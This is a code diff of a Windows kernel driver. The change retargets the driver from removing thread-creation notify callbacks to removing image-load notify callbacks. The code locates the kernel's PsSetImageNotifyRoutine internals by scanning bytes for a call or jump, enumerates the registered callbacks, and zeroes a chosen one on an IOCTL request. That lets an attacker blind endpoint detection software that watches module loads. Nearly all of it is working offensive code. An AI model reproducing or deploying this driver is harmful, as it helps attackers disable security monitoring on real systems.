@@ -9,13 +9,13 @@
     https://www.bordergate.co.uk/neutralising-kernel-callbacks/
 */
 
-#define DRIVER_NAME "Rm_ThreadsCallback"
-#define IOCTL_READ_THREAD_CALLBACK CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_RM_THREAD_CALLBACK CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define DRIVER_NAME "Rm_ImageCallback"
+#define IOCTL_READ_IMAGE_CALLBACK CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_RM_IMAGE_CALLBACK CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
 
-typedef struct _THREAD_CALLBACK_DATA {
+typedef struct _IMAGE_CALLBACK_DATA {
     int Index;
-} THREAD_CALLBACK_DATA, * PTHREAD_CALLBACK_DATA;
+} IMAGE_CALLBACK_DATA, * PIMAGE_CALLBACK_DATA;
 
 struct ModulesData {
     CHAR ModuleName[256];
@@ -305,7 +305,7 @@ typedef enum _SYSTEM_INFORMATION_CLASS
 } SYSTEM_INFORMATION_CLASS;
 
 typedef enum _NOTIFY_ROUTINE_TYPE {
-    ThreadCreateCallback
+    ImageLoadCallback
 } NOTIFY_ROUTINE_TYPE;
 
 NTSTATUS DriverCreateClose(PDEVICE_OBJECT, PIRP Irp);
@@ -377,19 +377,19 @@ UINT64 ResolveKernelBaseAddress() {
 
 UINT64 FindNotifyRoutineAddress() {
     UNICODE_STRING functionName;
-    RtlInitUnicodeString(&functionName, L"PsSetCreateThreadNotifyRoutine");
-    UINT64 PsSetCreateThreadNotifyRoutineAddress = (UINT64)MmGetSystemRoutineAddress(&functionName);
-    if (!PsSetCreateThreadNotifyRoutineAddress) {
-        DbgPrint("[%s]: Failed to get PsSetCreateThreadNotifyRoutine address\n", DRIVER_NAME);
+    RtlInitUnicodeString(&functionName, L"PsSetImageNotifyRoutine");
+    UINT64 PsSetImageNotifyRoutineAddress = (UINT64)MmGetSystemRoutineAddress(&functionName);
+    if (!PsSetImageNotifyRoutineAddress) {
+        DbgPrint("[%s]: Failed to get PsSetImageNotifyRoutine address\n", DRIVER_NAME);
         return 0;
     }
 
     UINT64 tempAddress = 0;
     for (int i = 0; i < 200; i++) {
-        BYTE byte = *(BYTE*)(PsSetCreateThreadNotifyRoutineAddress + i);
+        BYTE byte = *(BYTE*)(PsSetImageNotifyRoutineAddress + i);
         if (byte == 0xE9 || byte == 0xE8) {
-            LONG relativeOffset = *(LONG*)(PsSetCreateThreadNotifyRoutineAddress + i + 1);
-            tempAddress = PsSetCreateThreadNotifyRoutineAddress + i + 5 + relativeOffset;
+            LONG relativeOffset = *(LONG*)(PsSetImageNotifyRoutineAddress + i + 1);
+            tempAddress = PsSetImageNotifyRoutineAddress + i + 5 + relativeOffset;
             break;
         }
     }
@@ -537,8 +537,8 @@ NTSTATUS ProcessNotifyRoutine(ULONG64 NotifyRoutine, UCHAR** pBuffer, ModulesDat
 
 extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING)
 {
-    UNICODE_STRING DeviceName = RTL_CONSTANT_STRING(L"\\Device\\Rm_ThreadsCallback");
-    UNICODE_STRING SymbolicLinkName = RTL_CONSTANT_STRING(L"\\??\\Rm_ThreadsCallback");
+    UNICODE_STRING DeviceName = RTL_CONSTANT_STRING(L"\\Device\\Rm_ImageCallback");
+    UNICODE_STRING SymbolicLinkName = RTL_CONSTANT_STRING(L"\\??\\Rm_ImageCallback");
     PDEVICE_OBJECT DeviceObject = NULL;
     NTSTATUS status = STATUS_SUCCESS;
 
@@ -588,7 +588,7 @@ NTSTATUS DriverCreateClose(PDEVICE_OBJECT, PIRP Irp)
 VOID DriverUnload(PDRIVER_OBJECT DriverObject)
 {
     PDEVICE_OBJECT DeviceObject = DriverObject->DeviceObject;
-    UNICODE_STRING SymbolicLinkName = RTL_CONSTANT_STRING(L"\\??\\Rm_ThreadsCallback");
+    UNICODE_STRING SymbolicLinkName = RTL_CONSTANT_STRING(L"\\??\\Rm_ImageCallback");
 
     IoDeleteSymbolicLink(&SymbolicLinkName);
 
@@ -613,7 +613,7 @@ NTSTATUS DriverDeviceControl(PDEVICE_OBJECT, PIRP Irp)
     NTSTATUS status = STATUS_SUCCESS;
     ULONG64 count = 0;
 
-    if (irpSp->Parameters.DeviceIoControl.IoControlCode == IOCTL_READ_THREAD_CALLBACK)
+    if (irpSp->Parameters.DeviceIoControl.IoControlCode == IOCTL_READ_IMAGE_CALLBACK)
     {
         ULONG outLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;
 
@@ -645,10 +645,10 @@ NTSTATUS DriverDeviceControl(PDEVICE_OBJECT, PIRP Irp)
             count = 0;
         }
     }
-    else if (irpSp->Parameters.DeviceIoControl.IoControlCode == IOCTL_RM_THREAD_CALLBACK)
+    else if (irpSp->Parameters.DeviceIoControl.IoControlCode == IOCTL_RM_IMAGE_CALLBACK)
     {
-        PTHREAD_CALLBACK_DATA pThreadCallbackData = (PTHREAD_CALLBACK_DATA)Irp->AssociatedIrp.SystemBuffer;
-        if (pThreadCallbackData == NULL) {
+        PIMAGE_CALLBACK_DATA pImageCallbackData = (PIMAGE_CALLBACK_DATA)Irp->AssociatedIrp.SystemBuffer;
+        if (pImageCallbackData == NULL) {
             DbgPrint("[%s]: Invalid input buffer\n", DRIVER_NAME);
             status = STATUS_INVALID_PARAMETER;
             Irp->IoStatus.Status = status;
@@ -657,7 +657,7 @@ NTSTATUS DriverDeviceControl(PDEVICE_OBJECT, PIRP Irp)
             return status;
         }
 
-        DbgPrint("[%s]: Removing thread callback at Index: %lu\n", DRIVER_NAME, pThreadCallbackData->Index);
+        DbgPrint("[%s]: Removing image callback at Index: %lu\n", DRIVER_NAME, pImageCallbackData->Index);
 
         DWORD64 KernelBase = ResolveKernelBaseAddress();
         if (!KernelBase)
@@ -679,7 +679,7 @@ NTSTATUS DriverDeviceControl(PDEVICE_OBJECT, PIRP Irp)
 
                 DbgPrint("[%s]: [Index: %d] NotifyRoutineAddr: %llx\n", DRIVER_NAME, i, NotifyRoutineAddr);
 
-                if (pThreadCallbackData->Index == i) {
+                if (pImageCallbackData->Index == i) {
                     RtlZeroMemory((PVOID)TempAddr, sizeof(ULONG64));
                     status = STATUS_SUCCESS;
                 }
